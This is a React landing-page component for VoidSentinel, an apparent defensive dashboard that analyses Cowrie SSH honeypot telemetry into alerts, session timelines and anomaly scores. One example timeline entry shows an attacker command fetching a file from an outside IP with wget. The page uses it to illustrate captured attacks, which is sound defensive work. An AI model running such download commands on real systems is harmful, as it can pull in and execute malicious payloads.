import { motion, useReducedMotion } from "framer-motion";
import {
  ArrowRight, Bell, BrainCircuit, Database, FileUp, Fingerprint, LogIn, Menu, RadioTower, ScanSearch,
  ShieldCheck, Sparkles, UserPlus, Users, X,
} from "lucide-react";
import { useEffect, useState, type ReactNode } from "react";
import { Link } from "react-router-dom";

const spring = { type: "spring", stiffness: 260, damping: 26 } as const;

function Logo() {
  return (
    <span className="flex items-center gap-2.5">
      <svg viewBox="0 0 40 40" className="h-8 w-8" aria-hidden>
        <circle cx="20" cy="20" r="18" fill="none" stroke="#2F6BFF" strokeOpacity=".18" strokeWidth="2" />
        <circle cx="20" cy="20" r="11" fill="none" stroke="#2F6BFF" strokeOpacity=".35" strokeWidth="2" />
        <circle cx="20" cy="20" r="4.5" fill="#2F6BFF" />
        <path d="M20 20 L35 11" stroke="#2F6BFF" strokeWidth="2" strokeLinecap="round" />
      </svg>
      <span className="font-display text-[1.05rem] font-semibold tracking-[-0.02em]">VoidSentinel</span>
    </span>
  );
}

/** Rotating sonar sweep; blips glow as the beam passes. Static when reduced motion is requested. */
function Sonar() {
  const still = useReducedMotion();
  const blips = [
    { x: 62, y: 30, c: "#5B8DEF", d: 0.4 }, { x: 78, y: 58, c: "#9B6BF2", d: 1.3 },
    { x: 40, y: 72, c: "#E0631A", d: 2.4 }, { x: 28, y: 40, c: "#1F9E8F", d: 3.2 }, { x: 70, y: 78, c: "#D1366B", d: 2.0 },
  ];
  return (
    <div className="relative mx-auto aspect-square w-full max-w-[420px]">
      <svg viewBox="0 0 100 100" className="h-full w-full" aria-hidden>
        <defs>
          <radialGradient id="ld-bg" cx="50%" cy="50%" r="50%">
            <stop offset="0%" stopColor="#FFFFFF" stopOpacity=".95" />
            <stop offset="100%" stopColor="#DCE8FA" stopOpacity=".6" />
          </radialGradient>
          <linearGradient id="ld-sweep" x1="0" y1="0" x2="1" y2="0">
            <stop offset="0%" stopColor="#2F6BFF" stopOpacity="0" />
            <stop offset="100%" stopColor="#2F6BFF" stopOpacity=".35" />
          </linearGradient>
        </defs>
        <circle cx="50" cy="50" r="48" fill="url(#ld-bg)" stroke="#FFFFFF" strokeWidth=".6" />
        {[38, 27, 16].map((r) => <circle key={r} cx="50" cy="50" r={r} fill="none" stroke="#2F6BFF" strokeOpacity=".16" strokeWidth=".5" />)}
        <line x1="2" y1="50" x2="98" y2="50" stroke="#2F6BFF" strokeOpacity=".08" strokeWidth=".4" />
        <line x1="50" y1="2" x2="50" y2="98" stroke="#2F6BFF" strokeOpacity=".08" strokeWidth=".4" />
        <motion.g style={{ originX: "50px", originY: "50px" }}
                  animate={still ? undefined : { rotate: 360 }} transition={{ duration: 4, ease: "linear", repeat: Infinity }}>
          <path d="M50 50 L98 50 A48 48 0 0 0 83.9 16.1 Z" fill="url(#ld-sweep)" />
          <line x1="50" y1="50" x2="98" y2="50" stroke="#2F6BFF" strokeWidth=".7" strokeLinecap="round" />
        </motion.g>
        {blips.map((b) => (
          <g key={`${b.x}-${b.y}`}>
            <motion.circle cx={b.x} cy={b.y} r="4" fill={b.c} fillOpacity=".18"
                           animate={still ? undefined : { r: [1.5, 5, 1.5], opacity: [0, 0.9, 0] }}
                           transition={{ duration: 4, repeat: Infinity, delay: b.d, ease: "easeOut" }} />
            <circle cx={b.x} cy={b.y} r="1.4" fill={b.c} />
          </g>
        ))}
        <circle cx="50" cy="50" r="2.2" fill="#2F6BFF" />
      </svg>
      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ ...spring, delay: 0.6 }}
        className="glass absolute -bottom-2 left-2 rounded-2xl px-3 py-2 text-xs sm:left-0">
        <div className="font-semibold">Download followed by execution attempt</div>
        <div className="text-ink-soft">critical · 3 evidence events</div>
      </motion.div>
      <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} transition={{ ...spring, delay: 0.8 }}
        className="glass absolute -top-1 right-2 rounded-2xl px-3 py-2 text-xs sm:right-0">
        <div className="font-semibold">Unusualness 96</div>
        <div className="text-ink-soft">9 failed logins · typical 1</div>
      </motion.div>
    </div>
  );
}

function HealthPill() {
  const [state, setState] = useState<"checking" | "online" | "offline">("checking");
  useEffect(() => {
    let live = true;
    fetch("/api/health").then((r) => live && setState(r.ok ? "online" : "offline")).catch(() => live && setState("offline"));
    return () => { live = false; };
  }, []);
  const tone = state === "online" ? "#1F9E8F" : state === "offline" ? "#D1366B" : "#5F6B84";
  return (
    <span className="inline-flex items-center gap-2 rounded-full bg-white/75 px-3 py-1 text-xs font-semibold" role="status">
      <span className="relative flex h-2 w-2">
        {state === "online" && <span className="ping-soft absolute h-full w-full rounded-full" style={{ background: tone }} />}
        <span className="relative h-2 w-2 rounded-full" style={{ background: tone }} />
      </span>
      {state === "online" ? "Service online" : state === "offline" ? "Service unreachable" : "Checking service…"}
    </span>
  );
}

function Reveal({ children, delay = 0, className = "" }: { children: ReactNode; delay?: number; className?: string }) {
  const still = useReducedMotion();
  return (
    <motion.div className={className} initial={still ? false : { opacity: 0, y: 18 }} whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true, margin: "-60px" }} transition={{ ...spring, delay }}>
      {children}
    </motion.div>
  );
}

const STEPS = [
  { icon: RadioTower, title: "Capture", text: "A Cowrie SSH decoy on an isolated EC2 instance records connections, logins and commands." },
  { icon: ShieldCheck, title: "Sanitize", text: "Passwords and terminal recordings are stripped on the sensor before anything leaves it." },
  { icon: BrainCircuit, title: "Analyze", text: "Sessions are rebuilt, explainable rules raise alerts and an Isolation Forest ranks unusual behaviour." },
  { icon: ScanSearch, title: "Investigate", text: "Open an alert, see the exact events behind it on the timeline, and record a verdict." },
];

export default function Landing() {
  const still = useReducedMotion();
  const [menu, setMenu] = useState(false);
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => e.key === "Escape" && setMenu(false);
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, []);
  const scrollTo = (id: string) => {
    setMenu(false);
    document.getElementById(id)?.scrollIntoView({ behavior: still ? "auto" : "smooth", block: "start" });
  };
  const links = [["how", "How it works"], ["features", "Features"], ["sources", "Data sources"]] as const;

  return (
    <div className="min-h-screen">
      <header className="sticky top-0 z-30 px-4 pt-4 md:px-6">
        <nav className="glass-strong mx-auto flex max-w-6xl items-center justify-between gap-4 px-4 py-2.5" aria-label="Main">
          <Link to="/" aria-label="VoidSentinel home"><Logo /></Link>
          <div className="hidden items-center gap-1 md:flex">
            {links.map(([id, label]) => (
              <button key={id} onClick={() => scrollTo(id)} className="rounded-xl px-3 py-2 text-sm font-medium text-ink-soft transition hover:bg-white/70 hover:text-ink">{label}</button>
            ))}
          </div>
          <div className="hidden items-center gap-2 md:flex">
            <Link to="/signin?mode=signup" className="btn-ghost py-1.5"><UserPlus className="h-4 w-4" />Create account</Link>
            <Link to="/signin" className="btn-primary py-1.5"><LogIn className="h-4 w-4" />Sign in</Link>
          </div>
          <button className="rounded-xl p-2 md:hidden" aria-label={menu ? "Close menu" : "Open menu"} aria-expanded={menu} aria-controls="landing-menu" onClick={() => setMenu(!menu)}>
            {menu ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
          </button>
        </nav>
        {menu && (
          <div id="landing-menu" className="glass-strong mx-auto mt-2 flex max-w-6xl flex-col gap-1 p-3 md:hidden">
            {links.map(([id, label]) => <button key={id} onClick={() => scrollTo(id)} className="rounded-xl px-3 py-2 text-left text-sm font-medium">{label}</button>)}
            <Link to="/signin?mode=signup" className="btn-ghost mt-1"><UserPlus className="h-4 w-4" />Create account</Link>
            <Link to="/signin" className="btn-primary"><LogIn className="h-4 w-4" />Sign in</Link>
          </div>
        )}
      </header>

      <main className="mx-auto max-w-6xl px-4 md:px-6">
        {/* hero */}
        <section className="grid items-center gap-10 py-14 md:grid-cols-2 md:py-20">
          <motion.div initial={still ? false : "hidden"} animate="show"
                      variants={{ hidden: {}, show: { transition: { staggerChildren: 0.09 } } }}>
            <motion.div variants={{ hidden: { opacity: 0, y: 12 }, show: { opacity: 1, y: 0, transition: spring } }}><HealthPill /></motion.div>
            <motion.h1 variants={{ hidden: { opacity: 0, y: 14 }, show: { opacity: 1, y: 0, transition: spring } }}
                       className="mt-5 font-display text-[2.4rem] font-semibold leading-[1.08] tracking-[-0.03em] md:text-[3.2rem]">
              Triage real SSH attacks on a cloud decoy, with the evidence in view.
            </motion.h1>
            <motion.p variants={{ hidden: { opacity: 0, y: 14 }, show: { opacity: 1, y: 0, transition: spring } }}
                      className="mt-4 max-w-xl text-lg text-ink-soft">
              VoidSentinel turns Cowrie honeypot telemetry into explainable alerts, session timelines and an anomaly ranking you can check, then lets analysts record what deserves investigation.
            </motion.p>
            <motion.div variants={{ hidden: { opacity: 0, y: 14 }, show: { opacity: 1, y: 0, transition: spring } }} className="mt-7 flex flex-wrap gap-3">
              <Link to="/signin" className="btn-primary px-5 py-2.5">Sign in to the dashboard<ArrowRight className="h-4 w-4" /></Link>
              <Link to="/signin?mode=signup" className="btn-ghost px-5 py-2.5"><UserPlus className="h-4 w-4" />Create an account</Link>
              <button onClick={() => scrollTo("how")} className="rounded-xl px-3 py-2.5 text-sm font-semibold text-signal hover:underline">See how it works</button>
            </motion.div>
          </motion.div>
          <motion.div initial={still ? false : { opacity: 0, scale: 0.94 }} animate={{ opacity: 1, scale: 1 }} transition={{ ...spring, delay: 0.15 }}>
            <Sonar />
          </motion.div>
        </section>

        {/* how it works */}
        <section id="how" className="scroll-mt-28 py-12">
          <Reveal><h2 className="h-title">How it works</h2>
            <p className="mt-1 max-w-2xl text-ink-soft">From a connection on the decoy to an analyst's verdict, in four steps.</p></Reveal>
          <div className="relative mt-8">
            <svg className="absolute left-0 right-0 top-9 hidden h-2 w-full md:block" preserveAspectRatio="none" viewBox="0 0 100 2" aria-hidden>
              <motion.path d="M4 1 H96" stroke="#2F6BFF" strokeOpacity=".35" strokeWidth=".4" strokeDasharray="1 1" fill="none"
                           initial={still ? false : { pathLength: 0 }} whileInView={{ pathLength: 1 }} viewport={{ once: true }}
                           transition={{ duration: 1.4, ease: "easeInOut" }} />
            </svg>
            <ol className="relative grid gap-4 md:grid-cols-4">
              {STEPS.map(({ icon: Icon, title, text }, i) => (
                <Reveal key={title} delay={i * 0.08}>
                  <li className="glass lift h-full list-none p-5">
                    <span className="grid h-10 w-10 place-items-center rounded-2xl bg-signal-soft text-signal"><Icon className="h-5 w-5" /></span>
                    <div className="mt-3 text-xs font-semibold text-ink-faint">Step {i + 1}</div>
                    <h3 className="h-card mt-0.5">{title}</h3>
                    <p className="mt-1.5 text-sm text-ink-soft">{text}</p>
                  </li>
                </Reveal>
              ))}
            </ol>
          </div>
        </section>

        {/* features */}
        <section id="features" className="scroll-mt-28 py-12">
          <Reveal><h2 className="h-title">What analysts get</h2></Reveal>
          <div className="mt-8 grid grid-cols-12 gap-4">
            <Reveal className="col-span-12 md:col-span-7">
              <div className="glass lift h-full p-6">
                <Bell className="h-5 w-5 text-signal" />
                <h3 className="h-card mt-3">Explainable alerts</h3>
                <p className="mt-1.5 text-sm text-ink-soft">Every finding states why it fired, its threshold, a MITRE ATT&CK reference where one fits, and links to the exact events behind it.</p>
                <div className="mt-4 flex flex-wrap gap-2 text-xs">
                  {["Password guessing", "Repeated login failures", "Download attempt", "Download followed by execution", "Persistence", "Miner indicators"].map((t) => (
                    <span key={t} className="rounded-full bg-white/80 px-2.5 py-1 font-medium">{t}</span>
                  ))}
                </div>
              </div>
            </Reveal>
            <Reveal className="col-span-12 md:col-span-5" delay={0.06}>
              <div className="glass lift h-full p-6">
                <Sparkles className="h-5 w-5 text-signal" />
                <h3 className="h-card mt-3">Unusualness, not guesswork</h3>
                <p className="mt-1.5 text-sm text-ink-soft">An Isolation Forest ranks completed sessions against earlier traffic and shows which features set each one apart. It measures how rare behaviour is, not whether it is malicious.</p>
              </div>
            </Reveal>
            <Reveal className="col-span-12 md:col-span-5" delay={0.1}>
              <div className="glass lift h-full p-6">
                <h3 className="h-card">Session timeline</h3>
                <ol className="relative mt-4 space-y-2.5 pl-6 text-sm" aria-label="Example timeline">
                  <span className="absolute bottom-1 left-[7px] top-1 w-[2px] rounded-full bg-gradient-to-b from-phase-connect/50 via-phase-auth/50 to-phase-shell/50" aria-hidden />
                  {[["#5B8DEF", "Connection opened"], ["#9B6BF2", "Login failed · root"], ["#9B6BF2", "Login accepted by decoy"], ["#E0631A", "wget http://203.0.113.10/x"], ["#8592AA", "Connection closed"]].map(([c, t]) => (
                    <li key={t} className="relative">
                      <span className="absolute -left-[22px] top-1 h-3 w-3 rounded-full border-2 border-white" style={{ background: c }} aria-hidden />
                      <span className={t.startsWith("wget") ? "mono" : ""}>{t}</span>
                    </li>
                  ))}
                </ol>
              </div>
            </Reveal>
            <Reveal className="col-span-12 md:col-span-7" delay={0.14}>
              <div className="grid h-full gap-4 sm:grid-cols-3">
                {[
                  { icon: FileUp, t: "Dataset import", d: "JSON Lines, JSON arrays, CSV, .gz and .zip Cowrie logs, validated before anything is stored." },
                  { icon: Fingerprint, t: "Clear provenance", d: "Every page shows its source and traffic type: live sensor, demo traffic or an imported dataset." },
                  { icon: Users, t: "Two roles", d: "Analysts investigate and record verdicts. Admins also import data, retrain models and manage access." },
                ].map(({ icon: Icon, t, d }) => (
                  <div key={t} className="glass lift p-5">
                    <Icon className="h-5 w-5 text-signal" />
                    <h3 className="h-card mt-3">{t}</h3>
                    <p className="mt-1.5 text-sm text-ink-soft">{d}</p>
                  </div>
                ))}
              </div>
            </Reveal>
          </div>
        </section>

        {/* data sources */}
        <section id="sources" className="scroll-mt-28 py-12">
          <Reveal><h2 className="h-title">Two kinds of evidence, never mixed</h2></Reveal>
          <div className="mt-8 grid gap-4 md:grid-cols-2">
            <Reveal><div className="glass lift h-full p-6">
              <RadioTower className="h-5 w-5 text-sev-low" />
              <h3 className="h-card mt-3">Live AWS sensor</h3>
              <p className="mt-1.5 text-sm text-ink-soft">Cowrie on an isolated EC2 instance ships sanitized events through CloudWatch Logs. A heartbeat tells quiet traffic apart from a stalled collector.</p>
            </div></Reveal>
            <Reveal delay={0.08}><div className="glass lift h-full p-6">
              <Database className="h-5 w-5 text-[#7A4FE0]" />
              <h3 className="h-card mt-3">Imported datasets</h3>
              <p className="mt-1.5 text-sm text-ink-soft">Analyze historical Cowrie SSH and Telnet logs offline, each as its own labelled source with its own anomaly model. Flow datasets such as CIC-IDS2017 have no sessions or commands, so they don't fit this view.</p>
            </div></Reveal>
          </div>
        </section>

        {/* safety */}
        <Reveal>
          <section className="glass my-8 grid gap-4 p-6 text-sm md:grid-cols-3" aria-label="Safety">
            <div><b className="font-semibold">Passwords never stored.</b> <span className="text-ink-soft">Captured credentials are removed on the sensor and again at import.</span></div>
            <div><b className="font-semibold">Private by default.</b> <span className="text-ink-soft">The dashboard listens on 127.0.0.1 only and every API call requires sign-in.</span></div>
            <div><b className="font-semibold">Commands are inert.</b> <span className="text-ink-soft">Attacker input is redacted, truncated and shown as plain text.</span></div>
          </section>
        </Reveal>

        {/* final CTA */}
        <Reveal>
          <section className="glass-strong my-12 flex flex-col items-center gap-4 p-10 text-center">
            <h2 className="h-title">Open the dashboard</h2>
            <p className="max-w-lg text-ink-soft">Sign in with your account, or create one. Analyst access starts immediately; admin access needs an invite code or an admin's approval.</p>
            <div className="flex flex-wrap justify-center gap-3">
              <Link to="/signin" className="btn-primary px-5 py-2.5"><LogIn className="h-4 w-4" />Sign in</Link>
              <Link to="/signin?mode=signup" className="btn-ghost px-5 py-2.5"><UserPlus className="h-4 w-4" />Create an account</Link>
            </div>
          </section>
        </Reveal>
      </main>

      <footer className="mx-auto flex max-w-6xl flex-wrap items-center justify-between gap-3 px-6 pb-8 text-xs text-ink-faint">
        <Logo />
        <span>Cloud SSH honeypot and AI-assisted threat analysis · Built with Cowrie, FastAPI and React</span>
      </footer>
    </div>
  );
}
